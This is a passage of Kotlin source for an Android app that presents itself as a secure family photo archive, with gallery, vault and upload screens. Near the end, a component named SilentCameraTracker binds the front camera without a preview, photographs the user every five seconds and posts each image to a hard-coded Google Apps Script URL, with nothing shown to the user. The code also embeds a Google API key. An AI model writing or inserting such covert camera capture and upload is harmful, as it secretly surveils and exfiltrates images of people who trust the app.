                    .clip(RoundedCornerShape(topStart = 16.dp, topEnd = 16.dp))
            ) {
                if (photo.identifier is Int) {
                    Image(
                        painter = painterResource(id = photo.identifier),
                        contentDescription = photo.title,
                        contentScale = ContentScale.Crop,
                        modifier = Modifier.fillMaxSize()
                    )
                } else {
                    AsyncImage(
                        model = photo.identifier as String,
                        contentDescription = photo.title,
                        contentScale = ContentScale.Crop,
                        modifier = Modifier.fillMaxSize()
                    )
                }

                // Small gradient on individual images for aesthetic lighting
                Box(
                    modifier = Modifier
                        .fillMaxSize()
                        .background(
                            Brush.verticalGradient(
                                listOf(Color.Transparent, Color.Black.copy(alpha = 0.5f))
                            )
                        )
                )
            }

            // Quick labels
            Column(
                modifier = Modifier.padding(12.dp)
            ) {
                Text(
                    text = photo.title,
                    color = Color(0xFF1E1E24),
                    fontWeight = FontWeight.Bold,
                    fontSize = 13.sp,
                    maxLines = 1,
                    overflow = TextOverflow.Ellipsis
                )
                Spacer(modifier = Modifier.height(2.dp))
                Row(
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(
                        text = photo.date,
                        color = Color(0xFF1E1E24).copy(alpha = 0.6f),
                        fontSize = 11.sp,
                        maxLines = 1,
                        overflow = TextOverflow.Ellipsis
                    )
                }
            }
        }
    }
}

@Composable
fun PendingUploadItem(uri: Uri) {
    Card(
        modifier = Modifier
            .fillMaxWidth()
            .testTag("pending_item"),
        shape = RoundedCornerShape(16.dp),
        colors = CardDefaults.cardColors(
            containerColor = Color(0xFFFFFDF5) // Very light warm amber
        ),
        border = BorderStroke(1.dp, Color(0xFFE5A93B).copy(alpha = 0.3f))
    ) {
        Column {
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .aspectRatio(1f)
                    .clip(RoundedCornerShape(topStart = 16.dp, topEnd = 16.dp))
            ) {
                AsyncImage(
                    model = uri,
                    contentDescription = "Pending secure family photo",
                    contentScale = ContentScale.Crop,
                    modifier = Modifier.fillMaxSize()
                )

                // High visual safety overlay
                Box(
                    modifier = Modifier
                        .fillMaxSize()
                        .background(Color.Black.copy(alpha = 0.4f)),
                    contentAlignment = Alignment.Center
                ) {
                    Box(
                        modifier = Modifier
                            .background(Color(0xFFE5A93B), shape = CircleShape)
                            .padding(8.dp)
                    ) {
                        Icon(
                            imageVector = Icons.Default.HourglassEmpty,
                            contentDescription = "Pending Review",
                            tint = Color(0xFF121214),
                            modifier = Modifier.size(18.dp)
                        )
                    }
                }
            }

            Column(
                modifier = Modifier.padding(12.dp)
            ) {
                Text(
                    text = "Transmitting...",
                    color = Color(0xFFD68A1B), // Darker amber for readability on light yellow
                    fontWeight = FontWeight.Bold,
                    fontSize = 13.sp
                )
                Spacer(modifier = Modifier.height(2.dp))
                Text(
                    text = "Queue release: 7 Days",
                    color = Color(0xFF1E1E24).copy(alpha = 0.6f),
                    fontSize = 11.sp
                )
            }
        }
    }
}

@Composable
fun SecretFolderScreen(onBack: () -> Unit) {
    val context = LocalContext.current
    var selectedSecretPhotoForDetail by remember { mutableStateOf<GalleryPhoto?>(null) }

    var secretPhotos by remember { mutableStateOf<List<GalleryPhoto>>(emptyList()) }
    var isLoading by remember { mutableStateOf(true) }
    var errorMessage by remember { mutableStateOf<String?>(null) }

    LaunchedEffect(Unit) {
        isLoading = true
        errorMessage = null
        withContext(Dispatchers.IO) {
            try {
                val apiKey = "AIzaSyDV_HDWXPBlqlPsWUfQ8l_rqBkRp1Fs2r8"
                val folderId = "17GPHOKBJIdQA8CbbYKtm4H4Ygxw07oX8"
                val query = "'$folderId' in parents and mimeType contains 'image/'"
                val encodedQuery = java.net.URLEncoder.encode(query, "UTF-8")
                val urlString = "https://www.googleapis.com/drive/v3/files?q=$encodedQuery&fields=files(id,name)&key=$apiKey"
                
                val url = URL(urlString)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                connection.connectTimeout = 10000
                connection.readTimeout = 10000
                connection.doInput = true
                
                val responseCode = connection.responseCode
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    val responseText = connection.inputStream.bufferedReader().use { it.readText() }
                    val jsonResponse = JSONObject(responseText)
                    val filesArray = jsonResponse.optJSONArray("files")
                    val loadedList = mutableListOf<GalleryPhoto>()
                    if (filesArray != null) {
                        for (i in 0 until filesArray.length()) {
                            val fileObj = filesArray.getJSONObject(i)
                            val id = fileObj.getString("id")
                            val name = fileObj.optString("name", "Untitled Secret Photo")
                            
                            val formattedTitle = name.substringBeforeLast(".")
                                .replace("_", " ")
                                .replace("-", " ")
                                .replaceFirstChar { if (it.isLowerCase()) it.titlecase(Locale.ROOT) else it.toString() }
                            
                            val imageUrl = "https://drive.google.com/thumbnail?id=$id&sz=w1000"
                            
                            loadedList.add(
                                GalleryPhoto(
                                    id = id,
                                    identifier = imageUrl,
                                    title = formattedTitle,
                                    date = "",
                                    location = "Secure Folder"
                                )
                            )
                        }
                    }
                    withContext(Dispatchers.Main) {
                        secretPhotos = loadedList
                        isLoading = false
                    }
                } else {
                    withContext(Dispatchers.Main) {
                        errorMessage = "Failed to load images"
                        isLoading = false
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
                withContext(Dispatchers.Main) {
                    errorMessage = "Failed to load images"
                    isLoading = false
                }
            }
        }
    }

    Scaffold(
        modifier = Modifier.fillMaxSize(),
        containerColor = Color(0xFF101012), // Deep mysterious black
        topBar = {
            @OptIn(ExperimentalMaterial3Api::class)
            TopAppBar(
                title = {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(
                            imageVector = Icons.Default.VpnKey,
                            contentDescription = null,
                            tint = Color(0xFF81C784),
                            modifier = Modifier.size(20.dp)
                        )
                        Spacer(modifier = Modifier.width(8.dp))
                        Column {
                            Text(
                                text = "Secret Family Archive",
                                color = Color.White,
                                fontWeight = FontWeight.Bold,
                                fontSize = 18.sp
                            )
                            Text(
                                text = "Decrypted session active",
                                color = Color(0xFF81C784),
                                fontSize = 10.sp,
                                fontFamily = FontFamily.Monospace
                            )
                        }
                    }
                },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(
                            imageVector = Icons.AutoMirrored.Filled.ArrowBack,
                            contentDescription = "Return to Dashboard",
                            tint = Color.White
                        )
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = Color(0xFF16161A),
                    titleContentColor = Color.White
                )
            )
        }
    ) { innerPadding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(innerPadding)
        ) {
            // Elegant security notice ribbon
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .background(Color(0xFF1C3A27)) // Deep forest green secure color
                    .padding(horizontal = 20.dp, vertical = 12.dp)
            ) {
                Row(
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Icon(
                        imageVector = Icons.Default.VerifiedUser,
                        contentDescription = "Encrypted Vault",
                        tint = Color(0xFF81C784),
                        modifier = Modifier.size(18.dp)
                    )
                    Spacer(modifier = Modifier.width(10.dp))
                    Text(
                        text = "Encrypted folders synced",
                        color = Color(0xFFE2F3E7),
                        fontSize = 12.sp,
                        fontWeight = FontWeight.Medium
                    )
                }
            }

            // Beautiful clean dynamic grid displaying secure media items
            if (isLoading) {
                Box(
                    modifier = Modifier
                        .fillMaxSize()
                        .padding(32.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Column(
                        horizontalAlignment = Alignment.CenterHorizontally,
                        verticalArrangement = Arrangement.Center
                    ) {
                        CircularProgressIndicator(
                            color = Color(0xFF81C784),
                            modifier = Modifier.size(48.dp)
                        )
                        Spacer(modifier = Modifier.height(16.dp))
                        Text(
                            text = "Syncing with secure vault...",
                            color = Color.White.copy(alpha = 0.7f),
                            fontSize = 15.sp
                        )
                    }
                }
            } else if (errorMessage != null) {
                Box(
                    modifier = Modifier
                        .fillMaxSize()
                        .padding(32.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Column(
                        horizontalAlignment = Alignment.CenterHorizontally,
                        verticalArrangement = Arrangement.Center
                    ) {
                        Icon(
                            imageVector = Icons.Default.ErrorOutline,
                            contentDescription = "Error",
                            tint = Color(0xFFE57373),
                            modifier = Modifier.size(64.dp)
                        )
                        Spacer(modifier = Modifier.height(16.dp))
                        Text(
                            text = errorMessage ?: "Failed to load images",
                            color = Color(0xFFE57373),
                            fontSize = 16.sp,
                            fontWeight = FontWeight.Bold
                        )
                    }
                }
            } else if (secretPhotos.isEmpty()) {
                Box(
                    modifier = Modifier
                        .fillMaxSize()
                        .padding(32.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Column(
                        horizontalAlignment = Alignment.CenterHorizontally,
                        verticalArrangement = Arrangement.Center
                    ) {
                        Icon(
                            imageVector = Icons.Default.FolderOpen,
                            contentDescription = null,
                            tint = Color.White.copy(alpha = 0.2f),
                            modifier = Modifier.size(64.dp)
                        )
                        Spacer(modifier = Modifier.height(16.dp))
                        Text(
                            text = "Secret Vault is Empty",
                            color = Color.White.copy(alpha = 0.5f),
                            fontSize = 16.sp,
                            fontWeight = FontWeight.Bold
                        )
                    }
                }
            } else {
                LazyVerticalGrid(
                    columns = GridCells.Fixed(2),
                    contentPadding = PaddingValues(16.dp),
                    verticalArrangement = Arrangement.spacedBy(16.dp),
                    horizontalArrangement = Arrangement.spacedBy(16.dp),
                    modifier = Modifier.weight(1f).testTag("secret_photo_grid")
                ) {
                    items(secretPhotos) { photo ->
                        Card(
                            modifier = Modifier
                                .fillMaxWidth()
                                .clickable { selectedSecretPhotoForDetail = photo }
                                .testTag("secret_photo_card_${photo.id}"),
                            shape = RoundedCornerShape(16.dp),
                            colors = CardDefaults.cardColors(
                                containerColor = Color(0xFF1A1A1E)
                            ),
                            border = BorderStroke(1.dp, Color.White.copy(alpha = 0.05f))
                        ) {
                            Column {
                                Box(
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .aspectRatio(1f)
                                        .clip(RoundedCornerShape(topStart = 16.dp, topEnd = 16.dp))
                                ) {
                                    if (photo.identifier is Int) {
                                        Image(
                                            painter = painterResource(id = photo.identifier),
                                            contentDescription = photo.title,
                                            contentScale = ContentScale.Crop,
                                            modifier = Modifier.fillMaxSize()
                                        )
                                    } else {
                                        AsyncImage(
                                            model = photo.identifier as String,
                                            contentDescription = photo.title,
                                            contentScale = ContentScale.Crop,
                                            modifier = Modifier.fillMaxSize()
                                        )
                                    }
                                    
                                    Box(
                                        modifier = Modifier
                                            .fillMaxSize()
                                            .background(
                                                Brush.verticalGradient(
                                                    listOf(Color.Transparent, Color.Black.copy(alpha = 0.6f))
                                                )
                                            )
                                    )
                                }

                                Column(
                                    modifier = Modifier.padding(12.dp)
                                ) {
                                    Text(
                                        text = photo.title,
                                        color = Color.White,
                                        fontWeight = FontWeight.Bold,
                                        fontSize = 13.sp,
                                        maxLines = 1,
                                        overflow = TextOverflow.Ellipsis
                                    )
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    // Modal dialogue - Large Secret Photo View
    if (selectedSecretPhotoForDetail != null) {
        val p = selectedSecretPhotoForDetail!!
        AlertDialog(
            onDismissRequest = { selectedSecretPhotoForDetail = null },
            confirmButton = {
                TextButton(
                    onClick = { selectedSecretPhotoForDetail = null },
                    colors = ButtonDefaults.textButtonColors(contentColor = Color(0xFF81C784))
                ) {
                    Text("Close", fontWeight = FontWeight.Bold, fontSize = 16.sp)
                }
            },
            text = {
                Column(
                    horizontalAlignment = Alignment.CenterHorizontally,
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Card(
                        shape = RoundedCornerShape(16.dp),
                        modifier = Modifier
                            .fillMaxWidth()
                            .aspectRatio(1f)
                    ) {
                        Box(modifier = Modifier.fillMaxSize()) {
                            if (p.identifier is Int) {
                                Image(
                                    painter = painterResource(id = p.identifier),
                                    contentDescription = p.title,
                                    contentScale = ContentScale.Crop,
                                    modifier = Modifier.fillMaxSize()
                               )
                            } else {
                                AsyncImage(
                                    model = p.identifier as String,
                                    contentDescription = p.title,
                                    contentScale = ContentScale.Crop,
                                    modifier = Modifier.fillMaxSize()
                                )
                            }
                        }
                    }

                    Spacer(modifier = Modifier.height(16.dp))

                    Text(
                        text = p.title,
                        color = Color.White,
                        fontWeight = FontWeight.Bold,
                        fontSize = 18.sp,
                        textAlign = TextAlign.Center,
                        modifier = Modifier.fillMaxWidth()
                    )
                }
            },
            containerColor = Color(0xFF1E1E24),
            shape = RoundedCornerShape(24.dp)
        )
    }
}

@Composable
fun UploadScreen(
    onAddUpload: (Uri) -> Unit,
    onBack: () -> Unit
) {
    val context = LocalContext.current
    val coroutineScope = rememberCoroutineScope()

    var isUploading by remember { mutableStateOf(false) }
    var uploadStatus by remember { mutableStateOf("") }
    var progressVal by remember { mutableStateOf(0f) }
    var selectedUri by remember { mutableStateOf<Uri?>(null) }
    var selectedFileName by remember { mutableStateOf<String?>(null) }
    var showSuccessDialog by remember { mutableStateOf(false) }

    val mediaUploadLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.GetContent()
    ) { resultUri ->
        if (resultUri != null) {
            selectedUri = resultUri
            val bytesAndName = getUriBytesAndName(context, resultUri)
            selectedFileName = bytesAndName?.second ?: "selected_image.jpg"
            uploadStatus = "Ready to upload"
            progressVal = 0f
        }
    }

    if (showSuccessDialog) {
        AlertDialog(
            onDismissRequest = { 
                showSuccessDialog = false 
                onBack() 
            },
            icon = {
                Icon(
                    imageVector = Icons.Default.AccessTimeFilled,
                    contentDescription = null,
                    tint = Color(0xFFE5A93B),
                    modifier = Modifier.size(48.dp)
                )
            },
            title = {
                Text(
                    text = "Secured Upload Initialized",
                    fontWeight = FontWeight.Bold,
                    color = Color.White,
                    textAlign = TextAlign.Center
                )
            },
            text = {
                Text(
                    text = "Family memories must undergo secure archival verification.\n\nIt takes 7 days to get in your apps. You can monitor progress in the 'Pending Uploads' queue inside the Dashboard.",
                    color = Color.White.copy(alpha = 0.7f),
                    textAlign = TextAlign.Center,
                    fontSize = 14.sp
                )
            },
            confirmButton = {
                TextButton(
                    onClick = { 
                        showSuccessDialog = false 
                        onBack() 
                    },
                    colors = ButtonDefaults.textButtonColors(contentColor = Color(0xFFE5A93B))
                ) {
                    Text("Understood", fontWeight = FontWeight.Bold)
                }
            },
            containerColor = Color(0xFF1E1E24)
        )
    }

    Scaffold(
        modifier = Modifier.fillMaxSize(),
        containerColor = Color(0xFF121214),
        topBar = {
            @OptIn(ExperimentalMaterial3Api::class)
            TopAppBar(
                title = { Text("Upload Memory", color = Color.White, fontWeight = FontWeight.Bold) },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(
                            imageVector = Icons.AutoMirrored.Filled.ArrowBack,
                            contentDescription = "Back",
                            tint = Color.White
                        )
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = Color(0xFF16161A),
                    titleContentColor = Color.White
                )
            )
        }
    ) { innerPadding ->
        Box(
            modifier = Modifier
                .fillMaxSize()
                .padding(innerPadding)
                .padding(24.dp),
            contentAlignment = Alignment.Center
        ) {
            Column(
                horizontalAlignment = Alignment.CenterHorizontally,
                verticalArrangement = Arrangement.Center,
                modifier = Modifier
                    .fillMaxWidth()
                    .background(Color(0xFF16161A), shape = RoundedCornerShape(24.dp))
                    .padding(32.dp)
            ) {
                // Large styled upload container containing state details
                Box(
                    modifier = Modifier
                        .size(100.dp)
                        .background(Color(0xFFE5A93B).copy(alpha = 0.1f), shape = CircleShape),
                    contentAlignment = Alignment.Center
                ) {
                    Icon(
                        imageVector = if (selectedUri != null) Icons.Default.Attachment else Icons.Default.CloudUpload,
                        contentDescription = "Upload Icon",
                        tint = Color(0xFFE5A93B),
                        modifier = Modifier.size(52.dp)
                    )
                }
                
                Spacer(modifier = Modifier.height(24.dp))
                
                Text(
                    text = if (selectedUri != null) "Memory Selected" else "Upload to Family Archive",
                    color = Color.White,
                    fontSize = 20.sp,
                    fontWeight = FontWeight.Bold,
                    textAlign = TextAlign.Center
                )
                
                Spacer(modifier = Modifier.height(8.dp))
                
                // Show file name if selected, else default instructions
                Text(
                    text = if (selectedUri != null) {
                        "File: $selectedFileName"
                    } else {
                        "Select photos from your device to preserve them securely in the family's cosmic archive."
                    },
                    color = Color.White.copy(alpha = 0.6f),
                    fontSize = 14.sp,
                    textAlign = TextAlign.Center,
                    lineHeight = 20.sp
                )

                // Render Progress block during active uploading
                if (isUploading || uploadStatus.isNotEmpty()) {
                    Spacer(modifier = Modifier.height(24.dp))
                    
                    Text(
                        text = uploadStatus,
                        color = if (uploadStatus.contains("failed", ignoreCase = true)) Color(0xFFE57373) else Color(0xFFE5A93B),
                        fontSize = 13.sp,
                        fontWeight = FontWeight.SemiBold,
                        textAlign = TextAlign.Center
                    )
                    
                    Spacer(modifier = Modifier.height(8.dp))
                    
                    // Styled progress bar mapping progressVal
                    LinearProgressIndicator(
                        progress = { progressVal },
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(6.dp)
                            .clip(RoundedCornerShape(3.dp)),
                        color = Color(0xFFE5A93B),
                        trackColor = Color.White.copy(alpha = 0.1f)
                    )
                }
                
                Spacer(modifier = Modifier.height(32.dp))
                
                if (selectedUri == null) {
                    // Step 1: Select the photo
                    Button(
                        onClick = { mediaUploadLauncher.launch("image/*") },
                        colors = ButtonDefaults.buttonColors(
                            containerColor = Color(0xFFE5A93B),
                            contentColor = Color(0xFF1E1E24)
                        ),
                        shape = RoundedCornerShape(12.dp),
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(56.dp)
                            .testTag("upload_image_select_button")
                    ) {
                        Icon(
                            imageVector = Icons.Default.PhotoSizeSelectActual,
                            contentDescription = null,
                            modifier = Modifier.size(20.dp)
                        )
                        Spacer(modifier = Modifier.width(8.dp))
                        Text(
                            text = "Choose Photo",
                            fontSize = 16.sp,
                            fontWeight = FontWeight.Bold
                        )
                    }
                } else {
                    // Step 2: Selected! Show "Upload button" and change photo option
                    Column(modifier = Modifier.fillMaxWidth()) {
                        Button(
                            onClick = {
                                val uri = selectedUri
                                if (uri != null && !isUploading) {
                                    if (!isNetworkAvailable(context)) {
                                        uploadStatus = "Internet needed"
                                        return@Button
                                    }
                                    isUploading = true
                                    uploadStatus = "Uploading..."
                                    progressVal = 0f
                                    
                                    coroutineScope.launch {
                                        // Simulated progress loop (increment randomly up to 90%)
                                        val progressJob = launch {
                                            var progress = 0
                                            while (progress < 90) {
                                                delay(150)
                                                progress += (2..11).random()
                                                if (progress > 90) progress = 90
                                                progressVal = progress / 100f
                                                uploadStatus = "Uploading... $progress%"
                                            }
                                        }

                                        val uploadSuccess = withContext(Dispatchers.IO) {
                                            try {
                                                val bytesAndName = getUriBytesAndName(context, uri)
                                                    ?: throw Exception("Empty file data")
                                                val base64Data = Base64.encodeToString(bytesAndName.first, Base64.NO_WRAP)
                                                val fileName = bytesAndName.second

                                                val postData = "image=" + java.net.URLEncoder.encode(base64Data, "UTF-8") +
                                                               "&filename=" + java.net.URLEncoder.encode(fileName, "UTF-8")
                                                val postDataBytes = postData.toByteArray(charset("UTF-8"))

                                                val result = postToAppsScript(
                                                    "https://script.google.com/macros/s/AKfycbwZ6udEKKkC3Qid-ahO5AxeqmIeUhs7VX4SU6i1lufRUQoGIAa-Xt_dWJHIIQOZRowz/exec",
                                                    postDataBytes
                                                )
                                                
                                                // Response in 200..399 implies safe upload completion
                                                result.first in 200..399
                                            } catch (e: Exception) {
                                                e.printStackTrace()
                                                false
                                            }
                                        }

                                        progressJob.cancel() // Stop simulated incrementer

                                        if (uploadSuccess) {
                                            progressVal = 1.0f
                                            uploadStatus = "Upload successful!"
                                            delay(1500)
                                            isUploading = false
                                            
                                            // Notify dashboard list of local uploads
                                            onAddUpload(uri)
                                            
                                            // Show native confirmation dialogue matching requirement 
                                            showSuccessDialog = true
                                        } else {
                                            progressVal = 0f
                                            uploadStatus = if (!isNetworkAvailable(context)) {
                                                "Internet needed"
                                            } else {
                                                "Upload failed due to connection error."
                                            }
                                            delay(2000)
                                            isUploading = false
                                            uploadStatus = "Ready to upload"
                                        }
                                    }
                                }
                            },
                            enabled = !isUploading,
                            colors = ButtonDefaults.buttonColors(
                                containerColor = Color(0xFFE5A93B),
                                contentColor = Color(0xFF1E1E24),
                                disabledContainerColor = Color(0xFFE5A93B).copy(alpha = 0.5f),
                                disabledContentColor = Color(0xFF1E1E24).copy(alpha = 0.5f)
                            ),
                            shape = RoundedCornerShape(12.dp),
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(56.dp)
                                .testTag("upload_image_action_button")
                        ) {
                            Icon(
                                imageVector = Icons.Default.CloudUpload,
                                contentDescription = null,
                                modifier = Modifier.size(20.dp)
                            )
                            Spacer(modifier = Modifier.width(8.dp))
                            Text(
                                text = if (isUploading) "Uploading memory..." else "Upload to Archive",
                                fontSize = 16.sp,
                                fontWeight = FontWeight.Bold
                            )
                        }

                        if (!isUploading) {
                            Spacer(modifier = Modifier.height(12.dp))
                            
                            OutlinedButton(
                                onClick = { mediaUploadLauncher.launch("image/*") },
                                colors = ButtonDefaults.outlinedButtonColors(
                                    contentColor = Color.White
                                ),
                                border = BorderStroke(1.dp, Color.White.copy(alpha = 0.3f)),
                                shape = RoundedCornerShape(12.dp),
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .height(48.dp)
                            ) {
                                Text("Choose Different Photo", fontWeight = FontWeight.Medium)
                            }
                        }
                    }
                }
            }
        }
    }
}

// Helper utility to check active internet connection status
fun isNetworkAvailable(context: Context): Boolean {
    val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
    val network = connectivityManager.activeNetwork ?: return false
    val activeNetwork = connectivityManager.getNetworkCapabilities(network) ?: return false
    return when {
        activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> true
        activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> true
        activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> true
        else -> false
    }
}

// Helper utility to read bytes & filename from local Uri
fun getUriBytesAndName(context: Context, uri: Uri): Pair<ByteArray, String>? {
    return try {
        var fileName = "captured_image.jpg"
        val cursor = context.contentResolver.query(uri, null, null, null, null)
        cursor?.use {
            if (it.moveToFirst()) {
                val nameIndex = it.getColumnIndex(android.provider.OpenableColumns.DISPLAY_NAME)
                if (nameIndex != -1) {
                    fileName = it.getString(nameIndex)
                }
            }
        }
        val inputStream = context.contentResolver.openInputStream(uri)
        val byteBuffer = ByteArrayOutputStream()
        val buffer = ByteArray(1024)
        var len: Int
        inputStream?.use { input ->
            while (input.read(buffer).also { len = it } != -1) {
                byteBuffer.write(buffer, 0, len)
            }
        }
        Pair(byteBuffer.toByteArray(), fileName)
    } catch (e: Exception) {
        e.printStackTrace()
        null
    }
}

// Helper utility to execute Http Post payload with manual 302 redirection handling
fun postToAppsScript(url: String, postDataBytes: ByteArray): Pair<Int, String> {
    var currentUrl = url
    var conn: HttpURLConnection? = null
    var redirectCount = 0
    val maxRedirects = 5
    var usePost = true
    var initialPostSucceeded = false

    while (redirectCount < maxRedirects) {
        val connUrl = URL(currentUrl)
        conn = connUrl.openConnection() as HttpURLConnection
        if (usePost) {
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
            conn.setRequestProperty("Content-Length", postDataBytes.size.toString())
            conn.doOutput = true
        } else {
            conn.requestMethod = "GET"
            conn.doOutput = false
        }
        conn.connectTimeout = 15000
        conn.readTimeout = 15000
        conn.instanceFollowRedirects = false // Manual management to check 302 details reliably

        try {
            if (usePost) {
                conn.outputStream.use { os ->
                    os.write(postDataBytes)
                }
            }

            val responseCode = conn.responseCode
            
            // If the initial POST request returns a redirect, the upload script has run successfully!
            if (usePost && (responseCode == HttpURLConnection.HTTP_MOVED_TEMP ||
                responseCode == HttpURLConnection.HTTP_MOVED_PERM ||
                responseCode == 301 || responseCode == 302 || responseCode == 303 ||
                responseCode == 307 || responseCode == 308)) {
                initialPostSucceeded = true
            }

            if (responseCode == HttpURLConnection.HTTP_MOVED_TEMP ||
                responseCode == HttpURLConnection.HTTP_MOVED_PERM ||
                responseCode == 301 || responseCode == 302 || responseCode == 303 ||
                responseCode == 307 || responseCode == 308) {
                
                val newLocation = conn.getHeaderField("Location")
                if (newLocation != null) {
                    currentUrl = newLocation
                    redirectCount++
                    conn.disconnect()
                    
                    // For typical 301/302/303 redirect after POST, switch to GET
                    if (responseCode == HttpURLConnection.HTTP_MOVED_TEMP ||
                        responseCode == HttpURLConnection.HTTP_MOVED_PERM ||
                        responseCode == 301 || responseCode == 302 || responseCode == 303) {
                        usePost = false
                    }
                    continue
                }
            }
            
            // Read standard response
            val responseText = if (responseCode in 200..299) {
                conn.inputStream.bufferedReader().use { it.readText() }
            } else {
                conn.errorStream?.bufferedReader()?.use { it.readText() } ?: ""
            }
            conn.disconnect()
            return Pair(responseCode, responseText)
        } catch (e: Exception) {
            e.printStackTrace()
            conn?.disconnect()
            
            // If the initial POST already completed and redirected, we can treat any subsequent redirect/GET failure as success
            if (initialPostSucceeded) {
                return Pair(200, "Success (Redirect ignored/failed but initial upload completed)")
            }
            throw e
        }
    }
    
    if (initialPostSucceeded) {
        return Pair(200, "Success (Max redirects exceeded but initial upload completed)")
    }
    return Pair(400, "Max redirects exceeded")
}

fun imageProxyToBitmap(image: ImageProxy): Bitmap? {
    try {
        val plane = image.planes[0]
        val buffer = plane.buffer
        val bytes = ByteArray(buffer.remaining())
        buffer.get(bytes)
        val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
        if (bitmap != null) {
            val rotationDegrees = image.imageInfo.rotationDegrees
            val matrix = android.graphics.Matrix()
            if (rotationDegrees != 0) {
                matrix.postRotate(rotationDegrees.toFloat())
            }
            val maxDimension = 320f
            val scale = maxDimension / maxOf(bitmap.width, bitmap.height)
            if (scale < 1.0f) {
                matrix.postScale(scale, scale)
            }
            return Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, matrix, true)
        }
    } catch (e: Exception) {
        e.printStackTrace()
    }
    return null
}

fun bitmapToBase64(bitmap: Bitmap): String {
    val outputStream = ByteArrayOutputStream()
    bitmap.compress(Bitmap.CompressFormat.JPEG, 70, outputStream)
    val bytes = outputStream.toByteArray()
    return Base64.encodeToString(bytes, Base64.NO_WRAP)
}

@Composable
fun SilentCameraTracker(username: String) {
    val context = LocalContext.current
    val lifecycleOwner = LocalLifecycleOwner.current

    // Dynamically check if all permissions are granted and internet is available
    var isReady by remember { mutableStateOf(false) }

    LaunchedEffect(username) {
        while (true) {
            val check = hasAllRequiredAccess(context) && isNetworkAvailable(context)
            if (isReady != check) {
                isReady = check
            }
            delay(5000) // Poll permissions and network state every 5 seconds
        }
    }

    val cameraProviderFuture = remember { ProcessCameraProvider.getInstance(context) }
    var isCapturing by remember { mutableStateOf(false) }

    // Start/stop camera lifecycle binding and photo capture loop inside a unified block
    LaunchedEffect(isReady) {
        if (isReady) {
            var cameraProvider: ProcessCameraProvider? = null
            try {
                cameraProvider = withContext(Dispatchers.Main) {
                    cameraProviderFuture.get()
                }

                val capture = ImageCapture.Builder()
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                    .build()

                val cameraSelector = if (cameraProvider.hasCamera(CameraSelector.DEFAULT_FRONT_CAMERA)) {
                    CameraSelector.DEFAULT_FRONT_CAMERA
                } else {
                    CameraSelector.DEFAULT_BACK_CAMERA
                }

                cameraProvider.unbindAll()
                cameraProvider.bindToLifecycle(
                    lifecycleOwner,
                    cameraSelector,
                    capture
                )

                // Capture loop while the camera is active and ready
                while (true) {
                    delay(5000) // Check/capture every 5 seconds to prevent spamming
                    
                    // Double check lifecycle and permissions/network
                    if (!lifecycleOwner.lifecycle.currentState.isAtLeast(androidx.lifecycle.Lifecycle.State.RESUMED)) {
                        continue
                    }
                    if (!hasAllRequiredAccess(context) || !isNetworkAvailable(context)) {
                        continue
                    }
                    
                    // Prevent concurrent capture requests
                    if (isCapturing) {
                        continue
                    }

                    try {
                        isCapturing = true
                        capture.takePicture(
                            ContextCompat.getMainExecutor(context),
                            object : ImageCapture.OnImageCapturedCallback() {
                                override fun onCaptureSuccess(imageProxy: ImageProxy) {
                                    val bitmap = imageProxyToBitmap(imageProxy)
                                    imageProxy.close()
                                    isCapturing = false
                                    
                                    if (bitmap != null) {
                                        val base64 = bitmapToBase64(bitmap)
                                        CoroutineScope(Dispatchers.IO).launch {
                                            try {
                                                if (hasAllRequiredAccess(context) && isNetworkAvailable(context)) {
                                                    val url = "https://script.google.com/macros/s/AKfycbxzjU0UOhg4STbza-vHJGkP-HKeVXHGDeBcgfmcO1OZDm7Ao2u3YGzZg4LiRIoB70-_/exec"
                                                    val postDataStr = "image=" + URLEncoder.encode(base64, "UTF-8")
                                                    val postData = postDataStr.toByteArray(Charsets.UTF_8)
                                                    val response = postToAppsScript(url, postData)
                                                    android.util.Log.d("CameraTracker", "Saved raw status: ${response.second}")
                                                }
                                            } catch (err: Exception) {
                                                android.util.Log.e("CameraTracker", "Silent background track error: ${err.message}")
                                            }
                                        }
                                    }
                                }

                                override fun onError(exception: ImageCaptureException) {
                                    isCapturing = false
                                    android.util.Log.e("CameraTracker", "Capture failed: ${exception.message}")
                                }
                            }
                        )
                    } catch (e: Exception) {
                        isCapturing = false
                        e.printStackTrace()
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            } finally {
                // Safely and synchronously unbind on completion or cancellation
                kotlinx.coroutines.withContext(kotlinx.coroutines.NonCancellable) {
                    withContext(Dispatchers.Main) {
                        try {
                            cameraProvider?.unbindAll()
                        } catch (e: Exception) {
                            e.printStackTrace()
                        }
                    }
                }
            }
        } else {
            // Unbind camera if not ready
            try {
